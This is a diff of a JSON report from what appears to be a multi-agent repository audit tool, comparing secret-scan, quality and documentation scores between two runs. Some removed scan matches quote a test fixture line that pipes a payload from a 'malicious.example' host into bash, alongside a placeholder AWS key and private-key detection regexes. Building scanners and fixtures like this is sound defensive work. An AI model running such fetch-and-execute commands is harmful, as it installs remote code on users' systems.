@@ -1,47 +1,17 @@
 {
-  "generated_at": "2025-10-20T16:03:08.898549+00:00",
-  "repo_root": "C:\\Projects",
+  "generated_at": "2025-10-20T17:45:01.424108+00:00",
+  "repo_root": "C:\\Projects\\Trust_Bench_Clean\\Project2v2",
   "summary": {
-    "overall_score": 4.54,
+    "overall_score": 33.16,
     "grade": "needs_attention",
     "notes": "Composite built from agent contributions."
   },
   "agents": {
     "SecurityAgent": {
       "score": 0.0,
-      "summary": "Scanned 668 files and detected 15 potential secret hit(s).",
+      "summary": "Scanned 81 files and detected 8 potential secret hit(s).",
       "details": {
         "matches": [
-          {
-            "file": "C:\\Projects\\Project2\\mcp_http_server.py",
-            "pattern": "Private RSA Key",
-            "snippet": "t actual keys)\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",  # nosec\\n    \"Private EC Key\": r\"----"
-          },
-          {
-            "file": "C:\\Projects\\Project2\\MCP_SERVER_RESOLUTION.md",
-            "pattern": "AWS Access Key",
-            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\n   - Has injection patterns\\n   - Used "
-          },
-          {
-            "file": "C:\\Projects\\Project2\\trust_bench_server.py",
-            "pattern": "Private RSA Key",
-            "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
-          },
-          {
-            "file": "C:\\Projects\\Project2\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
-            "pattern": "AWS Access Key",
-            "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
-          },
-          {
-            "file": "C:\\Projects\\TrustBench\\trust_bench_server.py",
-            "pattern": "Private RSA Key",
-            "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
-          },
-          {
-            "file": "C:\\Projects\\TrustBench\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
-            "pattern": "AWS Access Key",
-            "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
-          },
           {
             "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\collaboration_demo\\report.json",
             "pattern": "AWS Access Key",
@@ -65,12 +35,12 @@
           {
             "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\output\\report.json",
             "pattern": "AWS Access Key",
-            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\n   - Has injection patterns\\\\n   - U"
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n   - Has injection pat"
           },
           {
             "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\output_self\\report.json",
             "pattern": "AWS Access Key",
-            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\n   - Has injection patterns\\\\\\\\n  "
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n   - Has injection pat"
           },
           {
             "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\quick_test\\report.json",
@@ -78,72 +48,69 @@
             "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\n   - Has injection patterns\\\\\\\\n  "
           },
           {
-            "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\test_metrics_run\\report.json",
-            "pattern": "AWS Access Key",
-            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n   - Has injection pat"
-          },
-          {
             "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\test_output\\report.json",
             "pattern": "AWS Access Key",
             "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\n   - Has injection patterns\\\\\\\\n  "
           }
         ],
-        "scanned": 668
+        "scanned": 81
       }
     },
     "QualityAgent": {
-      "score": 13.61,
-      "summary": "Indexed 672 files across 6 language group(s); 37 appear to be tests. (Adjusted for 15 security findings)",
+      "score": 4.48,
+      "summary": "Indexed 81 files across 5 language group(s); 1 appear to be tests. (Adjusted for 8 security findings)",
       "details": {
         "language_histogram": {
-          "other": 114,
-          "yaml": 23,
-          "markdown": 121,
-          "python": 219,
-          "json": 169,
-          "typescript": 26
+          "other": 8,
+          "yaml": 1,
+          "markdown": 32,
+          "python": 13,
+          "json": 27
         },
-        "total_files": 672,
-        "test_files": 37,
-        "test_ratio": 0.055
+        "total_files": 81,
+        "test_files": 1,
+        "test_ratio": 0.012
       }
     },
     "DocumentationAgent": {
-      "score": 0.0,
-      "summary": "No README markdown files discovered in the repository root.",
+      "score": 95.0,
+      "summary": "Found 2 README file(s) with roughly 2349 words and 25 section heading(s). (Adjusted for security gaps)",
       "details": {
-        "readme_paths": [],
-        "total_words": 0,
-        "sections": 0,
-        "has_quickstart": false,
-        "has_architecture": false,
+        "readme_paths": [
+          "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\README.md",
+          "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\READMEV2.md"
+        ],
+        "total_words": 2349,
+        "sections": 25,
+        "has_quickstart": true,
+        "has_architecture": true,
         "collaboration_adjustments": [
-          "Large project (672 files) needs better documentation - reduced score by 10"
+          "Security issues found but not addressed in docs - reduced score by 5"
         ]
       }
     }
   },
   "metrics": {
-    "system_latency_seconds": 6.0574,
-    "faithfulness": 0.47,
+    "system_latency_seconds": 0.0473,
+    "faithfulness": 0.6,
     "refusal_accuracy": 1.0,
     "per_agent_latency": {
       "SecurityAgent": {
-        "total_seconds": 6.0047,
+        "total_seconds": 0.0403,
         "tool_breakdown": {
-          "run_secret_scan": 6.0046
+          "run_secret_scan": 0.0403
         }
       },
       "QualityAgent": {
-        "total_seconds": 0.0494,
+        "total_seconds": 0.0038,
         "tool_breakdown": {
-          "analyze_repository_structure": 0.0493
+          "analyze_repository_structure": 0.0038
         }
       },
       "DocumentationAgent": {
-        "total_seconds": 0.0008,
+        "total_seconds": 0.0013,
         "tool_breakdown": {
-          "evaluate_documentation": 0.0006
+          "evaluate_documentation": 0.0012
         }
       }
     }
@@ -176,43 +143,13 @@
     {
       "sender": "SecurityAgent",
       "recipient": "Manager",
-      "content": "Secret scan completed. Risk level: HIGH (15 findings).",
+      "content": "Secret scan completed. Risk level: HIGH (8 findings).",
       "data": {
         "name": "secret_scan",
         "score": 0.0,
-        "summary": "Scanned 668 files and detected 15 potential secret hit(s).",
+        "summary": "Scanned 81 files and detected 8 potential secret hit(s).",
         "details": {
           "matches": [
-            {
-              "file": "C:\\Projects\\Project2\\mcp_http_server.py",
-              "pattern": "Private RSA Key",
-              "snippet": "t actual keys)\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",  # nosec\\n    \"Private EC Key\": r\"----"
-            },
-            {
-              "file": "C:\\Projects\\Project2\\MCP_SERVER_RESOLUTION.md",
-              "pattern": "AWS Access Key",
-              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\n   - Has injection patterns\\n   - Used "
-            },
-            {
-              "file": "C:\\Projects\\Project2\\trust_bench_server.py",
-              "pattern": "Private RSA Key",
-              "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
-            },
-            {
-              "file": "C:\\Projects\\Project2\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
-              "pattern": "AWS Access Key",
-              "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
-            },
-            {
-              "file": "C:\\Projects\\TrustBench\\trust_bench_server.py",
-              "pattern": "Private RSA Key",
-              "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
-            },
-            {
-              "file": "C:\\Projects\\TrustBench\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
-              "pattern": "AWS Access Key",
-              "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
-            },
             {
               "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\collaboration_demo\\report.json",
               "pattern": "AWS Access Key",
@@ -236,12 +173,12 @@
             {
               "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\output\\report.json",
               "pattern": "AWS Access Key",
-              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\n   - Has injection patterns\\\\n   - U"
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n   - Has injection pat"
             },
             {
               "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\output_self\\report.json",
               "pattern": "AWS Access Key",
-              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\n   - Has injection patterns\\\\\\\\n  "
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n   - Has injection pat"
             },
             {
               "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\quick_test\\report.json",
@@ -249,27 +186,22 @@
               "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\n   - Has injection patterns\\\\\\\\n  "
             },
             {
-              "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\test_metrics_run\\report.json",
-              "pattern": "AWS Access Key",
-              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n   - Has injection pat"
-            },
-            {
               "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\test_output\\report.json",
               "pattern": "AWS Access Key",
               "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\\\\\n   - Has injection patterns\\\\\\\\n  "
             }
           ],
-          "scanned": 668
+          "scanned": 81
         }
       }
     },
     {
       "sender": "SecurityAgent",
       "recipient": "QualityAgent",
-      "content": "FYI: Found 15 security issues that may impact quality assessment.",
+      "content": "FYI: Found 8 security issues that may impact quality assessment.",
       "data": {
         "security_context": {
-          "findings_count": 15,
+          "findings_count": 8,
           "risk_level": "high"
         }
       }
@@ -277,10 +209,10 @@
     {
       "sender": "SecurityAgent",
       "recipient": "DocumentationAgent",
-      "content": "Alert: 15 security findings detected - please check if docs address security practices.",
+      "content": "Alert: 8 security findings detected - please check if docs address security practices.",
       "data": {
         "security_alert": {
-          "findings_count": 15,
+          "findings_count": 8,
           "risk_level": "high"
         }
       }
@@ -288,7 +220,7 @@
     {
       "sender": "QualityAgent",
       "recipient": "SecurityAgent",
-      "content": "Incorporated your 15 security findings into quality assessment.",
+      "content": "Incorporated your 8 security findings into quality assessment.",
       "data": {
         "security_penalty": 25
       }
@@ -296,61 +228,71 @@
     {
       "sender": "QualityAgent",
       "recipient": "Manager",
-      "content": "Repository structure summarized. Adjusted quality score down by 25 points due to 15 security finding(s) from SecurityAgent.",
+      "content": "Repository structure summarized. Adjusted quality score down by 25 points due to 8 security finding(s) from SecurityAgent.",
       "data": {
         "name": "repository_structure",
-        "score": 13.61,
-        "summary": "Indexed 672 files across 6 language group(s); 37 appear to be tests. (Adjusted for 15 security findings)",
+        "score": 4.48,
+        "summary": "Indexed 81 files across 5 language group(s); 1 appear to be tests. (Adjusted for 8 security findings)",
         "details": {
           "language_histogram": {
-            "other": 114,
-            "yaml": 23,
-            "markdown": 121,
-            "python": 219,
-            "json": 169,
-            "typescript": 26
+            "other": 8,
+            "yaml": 1,
+            "markdown": 32,
+            "python": 13,
+            "json": 27
           },
-          "total_files": 672,
-          "test_files": 37,
-          "test_ratio": 0.055
+          "total_files": 81,
+          "test_files": 1,
+          "test_ratio": 0.012
         }
       }
     },
     {
       "sender": "DocumentationAgent",
       "recipient": "QualityAgent",
-      "content": "Used your metrics (files: 672, test ratio: 5.5%) to enhance documentation assessment.",
+      "content": "Used your metrics (files: 81, test ratio: 1.2%) to enhance documentation assessment.",
       "data": {
         "collaboration": "quality_metrics_integration"
       }
     },
     {
       "sender": "DocumentationAgent",
+      "recipient": "SecurityAgent",
+      "content": "Noted your 8 findings - documentation lacks security guidance.",
+      "data": {
+        "security_doc_gap": true
+      }
+    },
+    {
+      "sender": "DocumentationAgent",
       "recipient": "Manager",
-      "content": "Documentation review finished. Large project (672 files) needs better documentation - reduced score by 10",
+      "content": "Documentation review finished. Security issues found but not addressed in docs - reduced score by 5",
       "data": {
         "name": "documentation_review",
-        "score": 0.0,
-        "summary": "No README markdown files discovered in the repository root.",
+        "score": 95.0,
+        "summary": "Found 2 README file(s) with roughly 2349 words and 25 section heading(s). (Adjusted for security gaps)",
         "details": {
-          "readme_paths": [],
-          "total_words": 0,
-          "sections": 0,
-          "has_quickstart": false,
-          "has_architecture": false
+          "readme_paths": [
+            "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\README.md",
+            "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\READMEV2.md"
+          ],
+          "total_words": 2349,
+          "sections": 25,
+          "has_quickstart": true,
+          "has_architecture": true
         }
       }
     },
     {
       "sender": "Manager",
       "recipient": "All Agents",
-      "content": "Evaluation complete. Grade: NEEDS_ATTENTION (4.54 pts). Agents collaborated on 4 cross-communications. Collaborative adjustments: Security findings influenced quality and documentation scores; Quality assessment incorporated security analysis; Documentation score adjusted based on quality metrics.",
+      "content": "Evaluation complete. Grade: NEEDS_ATTENTION (33.16 pts). Agents collaborated on 5 cross-communications. Collaborative adjustments: Security findings influenced quality and documentation scores; Quality assessment incorporated security analysis; Documentation score adjusted based on quality metrics.",
       "data": {
-        "overall_score": 4.54,
+        "overall_score": 33.16,
         "grade": "needs_attention",
         "notes": "Composite built from agent contributions.",
         "collaboration_metrics": {
-          "interactions": 4,
+          "interactions": 5,
           "adjustments": [
             "Security findings influenced quality and documentation scores",
             "Quality assessment incorporated security analysis",
@@ -358,26 +300,26 @@
           ]
         },
         "metrics": {
-          "system_latency_seconds": 6.0574,
-          "faithfulness": 0.47,
+          "system_latency_seconds": 0.0473,
+          "faithfulness": 0.6,
           "refusal_accuracy": 1.0,
           "per_agent_latency": {
             "SecurityAgent": {
-              "total_seconds": 6.0047,
+              "total_seconds": 0.0403,
               "tool_breakdown": {
-                "run_secret_scan": 6.0046
+                "run_secret_scan": 0.0403
               }
             },
             "QualityAgent": {
-              "total_seconds": 0.0494,
+              "total_seconds": 0.0038,
               "tool_breakdown": {
-                "analyze_repository_structure": 0.0493
+                "analyze_repository_structure": 0.0038
               }
             },
             "DocumentationAgent": {
-              "total_seconds": 0.0008,
+              "total_seconds": 0.0013,
               "tool_breakdown": {
-                "evaluate_documentation": 0.0006
+                "evaluate_documentation": 0.0012
               }
             }
           }
